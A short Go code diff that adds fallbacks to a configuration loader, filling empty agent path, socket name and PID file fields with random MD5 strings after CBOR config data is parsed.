@@ -36,6 +36,21 @@ func InitConfig() (err error) {
 		return fmt.Errorf("parsing %d bytes of CBOR data (%s...): %v", len(configData), short_view, err)
 	}
 
+	// Fallback for critical fields if they are missing/empty
+	if RuntimeConfig.AgentRoot == "" {
+		RuntimeConfig.AgentRoot = util.RandMD5String()
+		logging.Printf("AgentRoot was empty, generated random: %s", RuntimeConfig.AgentRoot)
+	}
+	if RuntimeConfig.UtilsPath == "" {
+		RuntimeConfig.UtilsPath = util.RandMD5String()
+	}
+	if RuntimeConfig.SocketName == "" {
+		RuntimeConfig.SocketName = util.RandMD5String()
+	}
+	if RuntimeConfig.PIDFile == "" {
+		RuntimeConfig.PIDFile = util.RandMD5String()
+	}
+
 	// CA
 	transport.CACrtPEM = []byte(RuntimeConfig.CAPEM)
 
